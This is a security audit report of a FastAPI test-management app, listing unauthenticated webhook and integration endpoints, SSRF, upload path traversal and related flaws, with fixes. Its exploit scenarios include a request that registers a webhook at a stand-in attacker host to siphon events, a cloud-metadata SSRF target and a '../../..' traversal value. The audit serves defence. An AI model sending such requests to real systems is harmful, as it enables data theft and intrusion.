# ThoroTest — Security Audit

**Audit date:** 2026-07-16
**Version reviewed:** 1.9.0 (branch `feat/demo-ribbon`, commit `e9040d2`)
**Method:** Manual OWASP-style source review of the FastAPI backend, static frontend, CLI, and infrastructure. No dynamic/DAST or dependency-CVE scanning was run; findings are from code reading and are marked where they need runtime confirmation.

> ⚠️ **Headline:** Two clusters of API endpoints that mutate security-relevant state are served **with no authentication or authorization at all**. The README advertises a "full auth stack (JWT, RBAC, TOTP 2FA, OAuth, audit log)", and most of the app does enforce it — but the **Webhooks** router and the write half of the **Integrations** router were shipped without any auth dependency. This is a shipping-blocker for any internet-exposed deployment.

---

## Severity summary

| # | Finding | Severity | Confidence |
|---|---------|----------|-----------|
| C-1 | Webhooks API fully unauthenticated (CRUD + secret regen + SSRF) | **Critical** | Confirmed (source) |
| C-2 | Integrations create/update/delete unauthenticated | **Critical** | Confirmed (source) |
| C-3 | Blind SSRF via unauthenticated `POST /api/webhooks/{id}/test` (and webhook delivery) | **Critical** | Confirmed (source) |
| H-1 | Path traversal / arbitrary file write in attachment upload | **High** | Confirmed (source) |
| H-2 | No object-level authorization (any authenticated user, incl. `tester`, reads/writes all data) | **High** | Confirmed (source) |
| H-3 | Live Anthropic API key committed to working-tree `.env` (plaintext, real secret) | **High** | Confirmed (source) |
| M-1 | SSRF via admin-controlled integration/AI base URLs (GitLab self-hosted, `AI_BASE_URL`) | **Medium** | Confirmed (source) |
| M-2 | Attachment download is IDOR-able + no MIME/type restriction on upload | **Medium** | Confirmed (source) |
| M-3 | CSV/formula injection in CSV exports | **Medium** | Confirmed (source) |
| M-4 | In-memory login throttle is per-process, bypassable behind multiple workers/proxy | **Medium** | Confirmed (source) |
| M-5 | Weak password policy (6-char minimum, no complexity/breach check) | **Medium** | Confirmed (source) |
| M-6 | JWT has no rotation/short-lived access + refresh; 7-day bearer, revocation only via global `token_version` bump | **Medium** | Confirmed (source) |
| L-1 | CORS falls back to a single origin but `allow_headers=["*"]`/`allow_methods=["*"]`; `*` origin permitted by config | **Low** | Confirmed (source) |
| L-2 | Default admin `admin@localhost / admin` seeded; relies on operator changing it | **Low** | Confirmed (source) |
| L-3 | Verify GraphQL mutation resolvers enforce `context["user"]` (context resolves it but per-resolver enforcement not audited exhaustively) | **Low** | Needs confirmation |

---

## Critical findings

### C-1 — Webhooks API is completely unauthenticated
**File:** `backend/routers/webhooks.py` (whole module)

Every route is declared with only `db: Session = Depends(get_db)` and the router itself is mounted with no `dependencies=[...]`:

```python
router = APIRouter(tags=["webhooks"])

@router.get("/webhooks", ...)          def list_webhooks(db=Depends(get_db)): ...
@router.post("/webhooks", ...)         def create_webhook(payload, db): ...
@router.patch("/webhooks/{wh_id}", ...) def update_webhook(...): ...
@router.delete("/webhooks/{wh_id}", ...) def delete_webhook(...): ...
@router.post("/webhooks/{wh_id}/regenerate-secret", ...) ...
@router.post("/webhooks/{wh_id}/test", ...) ...
```

There is **no global auth middleware** — `backend/main.py` mounts routers with `app.include_router(webhooks.router, prefix="/api")` and no app-level dependency. So an anonymous attacker can:

- **List** all configured webhook delivery URLs (`GET /api/webhooks`).
- **Create** webhooks (`POST`) and receive the HMAC signing secret in the response body.
- **Rotate** any webhook's HMAC secret (`regenerate-secret`), silently breaking real integrations and letting the attacker forge signed payloads to the victim's receiver.
- **Delete** webhooks, disabling downstream alerting.

**Exploit scenario:** attacker hits `POST /api/webhooks {"url":"https://attacker/x","events":["run.completed"]}` with no token, gets back a valid `secret`, and now receives every run-completion event (which may contain internal run/test metadata), correctly HMAC-signed.

**Fix:** add `_: models.User = require_role("admin", "manager")` to every mutating route and `Depends(get_current_user)` to `list_webhooks`. **Effort:** ~30 min. **Risk of fix:** trivial.

### C-2 — Integrations create/update/delete unauthenticated
**File:** `backend/routers/integrations.py:24, 36, 88`

`sync_integration_now` correctly uses `WRITE_ROLES = require_role("admin","manager")`, but the three CRUD handlers do not:

```python
@router.post("/integrations", ...)      def create_integration(payload, db): ...   # no auth
@router.patch("/integrations/{id}", ...) def update_integration(intg_id, payload, db): ...  # no auth
@router.delete("/integrations/{id}", ...) def delete_integration(intg_id, db): ...  # no auth
```

Integration `config` (JSON) stores **git Personal Access Tokens and Jira API tokens** (`config.token`, `config.api_token`). An unauthenticated attacker can:

- Create/point an integration at an attacker-controlled repo/host, then have a legitimate admin's later "Sync" pull attacker YAML into the test library.
- Overwrite an existing integration's `repo_url`/`api_base` (SSRF pivot, see M-1) — the merge logic at `integrations.py:41-56` preserves the *stored* token when the client sends a blank one, so an attacker can **retarget a victim's real token at an attacker-controlled `api_base`**, exfiltrating it on the next sync.
- Delete integrations (denial of service to the tests-as-code pipeline).

**Fix:** same as C-1 — attach `WRITE_ROLES`. **Effort:** ~15 min.

### C-3 — Blind SSRF via webhook test/delivery (unauthenticated)
**File:** `backend/routers/webhooks.py:71-97`

`test_webhook` issues `await client.post(wh.url, ...)` to a fully attacker-chosen URL with a 5s timeout and returns the upstream status code. Combined with C-1 (no auth), any anonymous user can make the server perform outbound POSTs to arbitrary hosts and learn whether they responded 2xx/other — classic blind SSRF against cloud metadata endpoints (`http://169.254.169.254/…`), internal admin panels, and localhost services. Webhook *delivery* (`notifications._fire_webhooks`) has the same target-URL freedom.

**Fix:** (1) authenticate the endpoints (C-1); (2) validate/allow-list webhook target hosts, block RFC-1918/link-local/loopback and cloud metadata IPs, disable redirects, cap response size. **Effort:** ~1 day for a proper SSRF guard shared by webhooks + CI + git + AI clients.

---

## High findings

### H-1 — Path traversal / arbitrary file write on attachment upload
**File:** `backend/routers/attachments.py:40-79`

`entity_type`, `entity_id` come from multipart form fields and `file.filename` from the client, all unvalidated:

```python
rel_dir  = os.path.join(entity_type, str(entity_id))
abs_dir  = os.path.join(UPLOAD_DIR, rel_dir)
os.makedirs(abs_dir, exist_ok=True)
safe_filename = f"{uuid.uuid4().hex}_{file.filename}"
rel_path = os.path.join(rel_dir, safe_filename)
abs_path = os.path.join(UPLOAD_DIR, rel_path)
async with aiofiles.open(abs_path, "wb") as f: await f.write(content)
```

`entity_type="../../.."` (or a `file.filename` containing `../`) makes `os.path.join` walk outside `UPLOAD_DIR`, so an attacker with any write role (`tester` and up) can write attacker-controlled bytes to arbitrary filesystem paths the process can reach — overwrite app code, drop a `.py` on an import path, poison a systemd unit, etc. **This is a realistic path to RCE**, gated only by "any logged-in user".

**Fix:** whitelist `entity_type` against a known set; reject `entity_id`/filename containing path separators or `..`; `os.path.realpath` the result and assert it is inside `UPLOAD_DIR`; store only the UUID name and never the raw client filename in the path. **Effort:** ~1–2 h.

### H-2 — No object-level authorization; RBAC is coarse and global
**Files:** most routers; `backend/auth_utils.py:116` (`require_role`)

Authorization is purely role-based (`admin`/`manager`/`tester`) and global. There is no per-record, per-project, or per-owner check anywhere. `project_id` columns exist on `Test`/`Folder` but **no query filters by project or user**. Consequences: any authenticated `tester` can read and modify *every* test, run, defect, requirement, plan, and download *every* attachment (`download_attachment` only checks the row exists). For a single trusted team this is acceptable; as a multi-team or multi-tenant product it is a broken-access-control blocker.

**Fix:** introduce a tenancy/ownership model and enforce it in query builders (a shared scoping dependency). Large — see ROADMAP "multi-tenant" track. **Effort:** weeks.

### H-3 — Live API secret in working-tree `.env`
**File:** `.env:36`

`.env` is git-ignored (good — not committed), **but the working copy contains a real, non-placeholder `ANTHROPIC_API_KEY` (`sk-ant-api03-…`)**. Anyone with repo/disk/backup access, or a mis-scoped Docker `COPY .`, leaks it. `SECRET_KEY` is also the shipped dev default in this file.

**Fix:** rotate the Anthropic key immediately; keep only `.env.example` on disk; load real secrets from a secret manager/CI env, never a file in the source tree. **Effort:** minutes (plus key rotation).

---

## Medium findings

- **M-1 SSRF via admin URLs.** `AI_BASE_URL`, GitLab self-hosted `api_base`, and repo URLs are used to build outbound HTTP clients. These are admin-configured (lower risk than C-3) but still allow an admin/manager — or an attacker exploiting C-2 — to point the server at internal hosts. Apply the same SSRF allow-list.
- **M-2 Attachment download IDOR + unrestricted type.** `download_attachment` returns any attachment by integer id to any authenticated user (compounds H-2), and upload enforces size only (`MAX_UPLOAD_MB`) — no MIME/extension allow-list, so stored HTML/SVG could be served for stored-XSS if ever rendered inline. Serve downloads with `Content-Disposition: attachment` and a restrictive `Content-Security-Policy`.
- **M-3 CSV/formula injection.** `export_tests` / `export_run` build CSV from user fields (titles, results) with no neutralization of leading `= + - @`. Opening the export in Excel/Sheets can execute formulas. Prefix risky cells with `'`.
- **M-4 Per-process login throttle.** `_login_failures` is an in-process dict (`auth.py:37`). Behind multiple uvicorn workers or replicas the limit multiplies by worker count and resets on deploy — brute-force protection is best-effort only. Move to Redis (already on the roadmap) and/or enforce at the proxy.
- **M-5 Weak password policy.** Minimum 6 chars, no complexity, no breach-list check (`auth.py:69`, `:200`, `:267`). Raise to ≥12 with a zxcvbn/HIBP check.
- **M-6 JWT lifecycle.** 7-day access tokens (`auth_utils.py:21`), no refresh tokens, revocation only by bumping a global `token_version` (logs the user out *everywhere*, not per-session). Consider short-lived access + refresh, and per-session revocation.

## Low findings
- **L-1 CORS.** Default is same-origin (good), but `allow_methods=["*"]`, `allow_headers=["*"]`, and `ALLOWED_ORIGINS=*` is a supported value. Keep `*` out of any doc'd production config; tighten methods/headers.
- **L-2 Seeded default admin** `admin@localhost / admin` — documented "change immediately", but nothing forces it. Force a password change on first login, or generate a random admin password at seed time and print it once.
- **L-3 GraphQL enforcement.** `get_context` resolves the user with the same revocation check as REST (good); confirm every mutation resolver actually rejects `context["user"] is None`. Add a resolver-level guard/test.

---

## What is done well (security)
- **Password hashing:** argon2id primary with transparent upgrade from legacy `sha256_crypt` on login (`auth_utils.py:40, 52`).
- **OAuth CSRF:** single-use, 10-minute state nonces persisted and consumed (`oauth.py:54-70`).
- **Token revocation:** JWT `tv`/`token_version` check on every request, re-read from DB, honored by REST *and* GraphQL.
- **Secret hygiene in API responses:** integration/Jira tokens are never echoed (`token_set: true` only); blank-on-edit preserves stored secrets.
- **User enumeration resistance:** `forgot-password` always returns 202 with a constant body.
- **Prod safety rails:** refuses to boot with the default `SECRET_KEY` when `ENVIRONMENT=production`; refuses `DEMO_MODE` in production.
- **HMAC-signed webhooks**, per-user AI rate limiting, audit log with IP on auth events, API tokens are stored only as SHA-256 hashes.
- **No raw-SQL injection surface:** all queries go through SQLAlchemy ORM; the only `text()` uses are fixed DDL/`SELECT 1` with bound params.

The foundations are genuinely strong — which is exactly why the two unauthenticated routers (C-1/C-2) read as *oversights*, not a systemic failure. They are also cheap to fix.
</content>
</invoke>
